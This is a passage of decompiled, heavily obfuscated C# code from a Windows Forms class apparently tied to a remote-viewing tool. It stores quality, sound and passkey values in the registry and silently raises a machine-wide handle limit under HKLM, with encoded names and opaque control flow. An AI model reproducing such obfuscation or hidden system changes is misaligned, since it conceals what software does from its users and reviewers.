              continue;
            case 3:
              goto label_3;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string GET_qulity()
    {
      string qulity;
      try
      {
        RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256);
        try
        {
          RegistryKey registryKey2 = registryKey1.OpenSubKey(RegistryHandler.mainpath, true);
          try
          {
            if (RuntimeHelpers.GetObjectValue(registryKey2.GetValue(ZoomPictureBox.Selectedqulity)) != null)
            {
label_3:
              int num1 = 48108440;
              uint num2;
              switch ((num2 = (uint) (-1593614222 - ~(num1 * -914378613 - -(790971067 * (-1634014263 * -14644889))) * 439846651 ^ 1475028019)) % 3U)
              {
                case 0:
                  goto label_3;
                case 2:
                  qulity = registryKey2.GetValue(ZoomPictureBox.Selectedqulity).ToString();
                  goto label_17;
              }
            }
          }
          finally
          {
            if (registryKey2 != null)
            {
label_6:
              int num3 = 725677447;
              while (true)
              {
                int num4 = num3;
                uint num5;
                switch ((num5 = (uint) (-1593614222 - ~(num4 * -914378613 - -(790971067 * (-1634014263 * -14644889))) * 439846651 ^ 1475028019)) % 3U)
                {
                  case 1:
                    ((IDisposable) registryKey2).Dispose();
                    num3 = (int) num5 * 190357026 ^ -913487096;
                    continue;
                  case 2:
                    goto label_6;
                  default:
                    goto label_9;
                }
              }
            }
label_9:;
          }
        }
        finally
        {
          if (registryKey1 != null)
          {
label_11:
            int num6 = -743729495;
            while (true)
            {
              int num7 = num6;
              uint num8;
              switch ((num8 = (uint) (-1593614222 - ~(num7 * -914378613 - -(790971067 * (-1634014263 * -14644889))) * 439846651 ^ 1475028019)) % 3U)
              {
                case 0:
                  goto label_11;
                case 1:
                  ((IDisposable) registryKey1).Dispose();
                  num6 = (int) num8 * 772412140 ^ -612729796;
                  continue;
                default:
                  goto label_14;
              }
            }
          }
label_14:;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      qulity = (string) null;
label_17:
      return qulity;
    }

    public static void SET_SoundID(string id)
    {
      try
      {
        RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256).OpenSubKey(RegistryHandler.mainpath, true);
        registryKey.SetValue(ZoomPictureBox.Selectedsound, (object) id);
        registryKey.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string passkey()
    {
      string str;
      try
      {
        RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256);
        try
        {
          RegistryKey registryKey2 = registryKey1.OpenSubKey(RegistryHandler.mainpath, true);
          try
          {
            if (RuntimeHelpers.GetObjectValue(registryKey2.GetValue(EXGuarder.\u00371627673)) != null)
            {
label_3:
              int num1 = 1792748368;
              while (true)
              {
                uint num2;
                switch ((num2 = (uint) (((num1 ^ -(~739515399 ^ -29083308) * 2123941453 + (-(-73792619 - 731843145) - (-1668890175 * -1143836901 ^ -769928819) + -~1078184773 * 794301731)) * 1562378061 ^ ~(1835494587 ^ 939102388) ^ ~1970136856 - (-361375848 ^ -560688731) ^ -~-1549617040) + 1327755600 - 628357170)) % 4U)
                {
                  case 1:
                    str = registryKey2.GetValue(EXGuarder.\u00371627673).ToString();
                    num1 = (int) num2 * 1820428427 ^ -591705587;
                    continue;
                  case 2:
                    goto label_3;
                  case 3:
                    goto label_21;
                  default:
                    goto label_20;
                }
              }
            }
          }
          finally
          {
            if (registryKey2 != null)
            {
label_7:
              int num3 = 556303976;
              while (true)
              {
                uint num4;
                switch ((num4 = (uint) (((num3 ^ -(~739515399 ^ -29083308) * 2123941453 + (-(-73792619 - 731843145) - (-1668890175 * -1143836901 ^ -769928819) + -~1078184773 * 794301731)) * 1562378061 ^ ~(1835494587 ^ 939102388) ^ ~1970136856 - (-361375848 ^ -560688731) ^ -~-1549617040) + 1327755600 - 628357170)) % 3U)
                {
                  case 0:
                    goto label_7;
                  case 2:
                    ((IDisposable) registryKey2).Dispose();
                    num3 = (int) num4 * 461452019 ^ -1559723521;
                    continue;
                  default:
                    goto label_10;
                }
              }
            }
label_10:;
          }
        }
        finally
        {
          if (registryKey1 != null)
          {
label_12:
            int num5 = -1446149869;
            while (true)
            {
              uint num6;
              switch ((num6 = (uint) (((num5 ^ -(~739515399 ^ -29083308) * 2123941453 + (-(-73792619 - 731843145) - (-1668890175 * -1143836901 ^ -769928819) + -~1078184773 * 794301731)) * 1562378061 ^ ~(1835494587 ^ 939102388) ^ ~1970136856 - (-361375848 ^ -560688731) ^ -~-1549617040) + 1327755600 - 628357170)) % 3U)
              {
                case 0:
                  goto label_12;
                case 1:
                  ((IDisposable) registryKey1).Dispose();
                  num5 = (int) num6 * 1908103040 ^ -448257750;
                  continue;
                default:
                  goto label_15;
              }
            }
          }
label_15:;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_17:
        int num7 = -2116657836;
        while (true)
        {
          uint num8;
          switch ((num8 = (uint) (((num7 ^ -(~739515399 ^ -29083308) * 2123941453 + (-(-73792619 - 731843145) - (-1668890175 * -1143836901 ^ -769928819) + -~1078184773 * 794301731)) * 1562378061 ^ ~(1835494587 ^ 939102388) ^ ~1970136856 - (-361375848 ^ -560688731) ^ -~-1549617040) + 1327755600 - 628357170)) % 3U)
          {
            case 1:
              ProjectData.ClearProjectError();
              num7 = (int) num8 * -1504775530 ^ -386823831;
              continue;
            case 2:
              goto label_17;
            default:
              goto label_20;
          }
        }
      }
label_20:
      str = EXGuarder.\u0035F2A2959;
label_21:
      return str;
    }

    public static void SetUserHandleLimit()
    {
      try
      {
        string name = EXGuarder.\u0036E1A0421;
label_1:
        int num1 = 966636739;
        RegistryKey registryKey;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(~(num1 - (-(1841105134 - 162589148 - 137680496) - (~-622516728 ^ 1169357543) ^ ~-(-1007147643 * 1392136591))) - 1676696774 ^ -782249382) - -1070711311)) % 4U)
          {
            case 0:
              goto label_1;
            case 2:
              registryKey.SetValue(EXGuarder.\u00314735159, (object) 18000, RegistryValueKind.DWord);
              num1 = (int) num2 * 1684182079 ^ 1577318263;
              continue;
            case 3:
              registryKey = Registry.LocalMachine.OpenSubKey(name, true);
              num1 = (int) num2 * -493144887 ^ -2024970955;
              continue;
            default:
              goto label_6;
          }
        }
label_6:
        registryKey.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_8:
        int num3 = 732923391;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (-(~(num3 - (-(1841105134 - 162589148 - 137680496) - (~-622516728 ^ 1169357543) ^ ~-(-1007147643 * 1392136591))) - 1676696774 ^ -782249382) - -1070711311)) % 3U)
          {
            case 0:
              goto label_8;
            case 1:
              ProjectData.ClearProjectError();
              num3 = (int) num4 * -1134120143 ^ 1527978058;
              continue;
            case 2:
              goto label_10;
            default:
              goto label_3;
          }
        }
label_10:
        return;
label_3:;
      }
    }

    [DebuggerNonUserCode]
    protected virtual void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = 377396291;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ~(~~~(-(~-766849431 * -1158753275) - -79634535 * -50305168 - num2) - ~-1917369283)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              int num4 = ((ZoomPictureBox) this).components == null ? 175473608 : (num4 = -935055005);
              num1 = num4 ^ (int) num3 * -924651866;
              continue;
            case 2:
              goto label_3;
            case 3:
              ((ZoomPictureBox) this).components.Dispose();
              num1 = (int) num3 * -2093879803 ^ 2030870005;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        // ISSUE: explicit non-virtual call
        __nonvirtual (((ContainerControl) this).Dispose(disposing));
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((ZoomPictureBox) this).components = (IContainer) new System.ComponentModel.Container();
      ((ContainerControl) this).AutoScaleMode = AutoScaleMode.Font;
    }
  }
}
